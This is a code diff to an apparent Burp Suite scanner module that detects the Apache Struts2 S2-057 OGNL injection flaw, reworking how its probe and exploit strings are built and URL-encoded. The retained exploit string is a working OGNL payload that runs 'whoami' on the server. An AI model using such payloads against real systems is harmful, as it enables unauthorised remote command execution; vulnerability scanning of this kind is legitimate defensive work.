@@ -9,15 +9,12 @@ import java.util.Arrays;
 import java.util.List;
 
 public class S2_057 extends IModule {
-    String poc =
-            "${" +
-            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
-            ".(#ct=#request['struts.valueStack'].context)" +
-            ".(#f=#ct['com.opensymphony.xwork2.dispatcher.HttpServletResponse'])" +
-            ".(#f.addHeader('poc','"+injectMark[0]+"'+'"+injectMark[1]+"'))" +
-            "}";
+    public S2_057() {
+        poc =
+            "${'"+injectMark[0]+"'+'"+injectMark[1]+"'}";
+        poc = URLEncoder.encode(poc);
 
-    public String exp =
+        exp =
             "${" +
             "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
             ".(#ct=#request['struts.valueStack'].context)" +
@@ -29,13 +26,14 @@ public class S2_057 extends IModule {
             ".(#a=@java.lang.Runtime@getRuntime().exec('whoami'))" +
             ".(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))" +
             "}";
+        exp = URLEncoder.encode(exp);
+    }
 
     @Override
     public IScanIssue start() {
         byte[] response = iHttpRequestResponse.getResponse();
         IResponseInfo iResponseInfo = helpers.analyzeResponse(response);
         short statusCode = iResponseInfo.getStatusCode();
-
         //仅对跳转页面进行判断
         if (statusCode == 302) {
             List<String> headers = requestInfo.getHeaders();
@@ -43,13 +41,13 @@ public class S2_057 extends IModule {
             byte[] requestBody = Arrays.copyOfRange(request, bodyOffset, request.length);
             String path = requestInfo.getUrl().getPath();
             String[] strings = path.split("/");
-            String newPath = path.replace(strings[strings.length - 1], URLEncoder.encode(poc) + "/" + strings[strings.length - 1]);
+            String newPath = path.replace(strings[strings.length - 1], poc + "/" + strings[strings.length - 1]);
 
             headers.set(0, headers.get(0).replace(path, newPath));
             try {
                 request = helpers.buildHttpMessage(headers, requestBody);
                 if (check()) {
-                this.detail = URLEncoder.encode(exp);
+                    this.detail = exp;
                     return creatCustomScanIssue();
                 }
             } catch (Exception e) {
